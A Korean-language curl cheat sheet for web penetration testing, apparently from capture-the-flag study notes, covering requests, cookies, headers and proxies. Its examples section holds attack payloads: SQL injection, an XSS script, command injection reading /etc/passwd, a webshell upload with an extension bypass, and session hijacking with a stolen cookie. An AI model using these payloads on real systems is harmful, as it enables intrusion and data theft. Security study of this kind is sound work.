### 기본 요청

-v 옵션은 항상 기본으로 사용하기

```bash
# 기본 GET 요청
curl http://target.com

# 응답을 파일로 저장
curl -o output.html http://target.com

# 조용히 응답 받기 (진행률 표시 없음)
curl -s http://target.com

# 리다이렉션 자동 따라가기
curl -L http://target.com
```

### 디버깅 및 정보 수집

```bash
# 헤더 정보 포함 (-i) 또는 헤더만 표시 (-I)
curl -i http://target.com
curl -I http://target.com

# 상세 디버깅 정보 (요청/응답 헤더 등)
curl -v http://target.com
```

### 인증 및 세션

```bash
# 기본 인증
curl -u username:password http://target.com

# Bearer 토큰 인증
curl -H "Authorization: Bearer TOKEN" http://target.com

# 쿠키 저장 (-c)
curl -c cookies.txt http://target.com

# 쿠키 사용 (-b)
curl -b cookies.txt http://target.com

# 쿠키 저장 및 사용 동시에 (세션 유지)
curl -b cookies.txt -c cookies.txt http://target.com
```

### 데이터 전송

```bash
# POST 요청
curl -X POST -d "param1=value1&param2=value2" http://target.com

# 폼 데이터로 POST 요청
curl -X POST -F "name=user" -F "profile=@shell.php" http://target.com/upload

# JSON 데이터 전송
curl -X POST -H "Content-Type: application/json" -d '{"key":"value"}' http://target.com

# Content-Type 헤더 설정
curl -H "Content-Type: application/x-www-form-urlencoded" -d "param=value" http://target.com
```

### 헤더 조작

```bash
# 사용자 정의 헤더 추가
curl -H "User-Agent: Mozilla/5.0" http://target.com

# 여러 헤더 추가
curl -H "X-Forwarded-For: 127.0.0.1" -H "Referer: http://google.com" http://target.com
```

### SSL/프록시 관련

```bash
# SSL 인증서 검증 무시 (보안 경고 무시)
curl -k https://target.com

# Burp Suite나 다른 프록시 사용
curl -x http://127.0.0.1:8080 http://target.com

# SOCKS 프록시 사용 (Tor 등)
curl --socks5 127.0.0.1:9050 http://target.com
```

## 침투 테스트 실전 예시

### 웹 취약점 테스트

```bash
# SQL 인젝션
curl "http://target.com/page.php?id=1' OR 1=1--"

# XSS 테스트
curl "http://target.com/search?q=<script>alert(1)</script>"

# 명령어 인젝션
curl -X POST "http://target.com/execute?cmd=cat+/etc/passwd"

# 파일 업로드 취약점 (확장자 우회)
curl -X POST -F "file=@webshell.php;filename=image.jpg;type=image/jpeg" http://target.com/upload
```

### 인증 우회 및 세션 작업

```bash
# CSRF 토큰 추출 후 사용
TOKEN=$(curl -s -c cookies.txt http://target.com/form | grep -o 'csrf_token" value="[^"]*' | cut -d'"' -f3)
curl -b cookies.txt -d "csrf_token=$TOKEN&username=admin&password=password" http://target.com/login

# 쿠키 조작으로 세션 하이재킹
curl -b "sessionid=STOLEN_SESSION_VALUE" http://target.com/admin

# HTTP 기본 인증 테스트
curl -u admin:password http://target.com/admin
```

### 유용한 도구 조합

```bash
# URL 인코딩 (Python 활용)
curl "http://target.com/search?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('<script>alert(1)</script>'))")"

# Base64 인코딩 헤더 사용 (Basic Auth)
curl -H "Authorization: Basic $(echo -n 'admin:password' | base64)" http://target.com

# 404 오류 페이지 숨기기
curl -f http://target.com/admin || echo "페이지 없음"

# 응답에서 특정 정보 필터링
curl -s http://target.com | grep "flag"
```

### 실전 로그인 및 세션 유지 예시

```bash
# 로그인하여 세션 쿠키 저장
curl -c cookies.txt -X POST http://lookup.thm/login.php -d 'username=admin&password=password123' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'

# 저장된 쿠키로 인증된 페이지 접근
curl -b cookies.txt http://lookup.thm/dashboard.php
```
